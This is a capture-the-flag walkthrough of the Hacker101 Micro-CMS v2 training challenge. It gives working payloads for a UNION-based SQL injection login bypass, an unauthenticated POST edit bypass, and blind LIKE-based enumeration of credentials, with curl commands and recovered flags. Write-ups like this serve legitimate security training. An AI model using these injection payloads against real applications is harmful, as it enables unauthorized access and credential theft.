# Micro-CMS v2 (Hacker101)

Python/MySQL app: public pages, **private** pages for admins, **create** requires login. **Three flags** — SQLi on login, **HTTP method** mismatch on **edit**, and **blind SQLi** to recover real credentials.

> Replace `BASE` with your instance (e.g. `https://b6554b4894e5bf251c908bac1adce0f4.ctf.hacker101.com`).

Hints and screenshots: [testert1ng/hacker101-ctf — micro-cms_v2](https://github.com/testert1ng/hacker101-ctf/tree/master/micro-cms_v2).

---

## Flag 0 — `UNION` login (“more perfect union”)

The login query is along the lines of:

`SELECT password FROM admins WHERE username='%s'`

(with string formatting). A **single-quote** in `username` triggers a syntax error. Use **`UNION`** so the query returns a **password value you choose**, then submit that string as the **password**.

**Payload**

- **Username:** `' UNION SELECT '123' AS password#`  
- **Password:** `123`

Then browse **`/page/<id>`** until you hit a **private** page (often a new id appears on the home index after you are “admin”).

```bash
curl -sS -c jar.txt -X POST "$BASE/login" \
  --data-urlencode "username=' UNION SELECT '123' AS password#" \
  --data-urlencode 'password=123'
curl -sS -b jar.txt "$BASE/page/3" | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example (this instance):** `^FLAG^d726750d2ce7393ec81989d7aa667f9ad674f3a3a71feca3750c377d0938f6f4$FLAG$`

---

## Flag 1 — `GET` blocked, anonymous **`POST /page/edit/<id>`**

**`GET /page/edit/1`** redirects unauthenticated users to **`/login`**. The **`POST`** handler for the same path does **not** enforce the same check, so you can submit an edit **without a session** and the response includes the flag (often in a banner or error path).

```bash
curl -sS -X POST "$BASE/page/edit/1" \
  -d 'title=x&body=y' | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example (this instance):** `^FLAG^364c1e8df8541a7f5a1a6af189ef7b31ee42a29726db5f5dd5119946cf4077a2$FLAG$`

---

## Flag 2 — blind `LIKE` on real credentials (“credentials are secret…”)

Logging in with **`' or 1=1#`** and a random password yields **“Invalid password”** — a row matched, so you can **infer** truth via **`LIKE`** predicates on **`username`** and **`password`**.

1. **Enumerate username** (character by character):  
   `' OR username LIKE '<prefix>%'#`  
   When a prefix is correct, the app responds like a **known user** + wrong password (**“Invalid password”**). Wrong prefix → **“Unknown user”**.

2. **Enumerate password** for that username:  
   `<username>' AND password LIKE '<prefix>%'#`  
   Same **Invalid password** vs **Unknown user** distinction.

On this instance that yielded **`kamala` / `dorthy`**. Normal login then returns the flag in the response.

```bash
curl -sS -X POST "$BASE/login" \
  -d 'username=kamala&password=dorthy' | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example (this instance):** `^FLAG^501fbde24e5785adc2593b6a20650773ffb639d09ecfcd060ba1f37dd718fc44$FLAG$`

*(Older public notes sometimes show password **`grover`**; Hacker101 rotates per deployment.)*

**References:** [Martino Tommasini — Micro-CMS v2](https://martinotommasini.github.io/posts/Micro-CMS-v2/), [testert1ng flag2](https://github.com/testert1ng/hacker101-ctf/tree/master/micro-cms_v2/flag2).

---

## Quick map

| # | Class | Location / idea |
|---|--------|------------------|
| 0 | SQLi `UNION` | `POST /login` → private **`GET /page/<id>`** |
| 1 | Weak auth on **POST** only | `POST /page/edit/<id>` without cookies |
| 2 | Blind SQLi (`LIKE`) | Recover **`username`/`password`**, then `POST /login` |

---

## License

Challenge content is © HackerOne / Hacker101. These notes are for education only.
